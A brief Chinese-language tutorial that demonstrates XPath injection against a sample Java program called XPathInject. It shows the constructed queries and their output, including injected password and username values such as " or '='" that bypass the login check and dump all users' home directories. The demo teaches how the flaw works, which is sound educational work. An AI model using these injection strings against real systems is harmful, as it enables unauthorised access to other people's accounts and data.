# XPath注入示例

使用如下语句正常获取记录:  

<pre>
$ java XPathInject 'zhangsan' '123456'
//users/user[username/text()='zhangsan' and password/text() = '123456']/home_dir/text()
/home/hello_zhangsan
</pre>

对于不正常的用户名和密码返回空:

<pre>
$ java XPathInject lisi 123456
//users/user[username/text()='lisi' and password/text() = '123456']/home_dir/text()
Can not found the given user directory
</pre>

知道用户名称忽略其密码:

<pre>
$ java XPathInject lisi " or '='"
//users/user[username/text()='lisi' and password/text() = ' or '='']/home_dir/text()
/home/lisi
</pre>

盲注的效果:

<pre>
$ java XPathInject "zhangsan or '='" " or '='"
//users/user[username/text()='zhangsan or '='' and password/text() = ' or '='']/home_dir/text()
/home/hello_zhangsan
/home/lisi
/home/wangwu
</pre>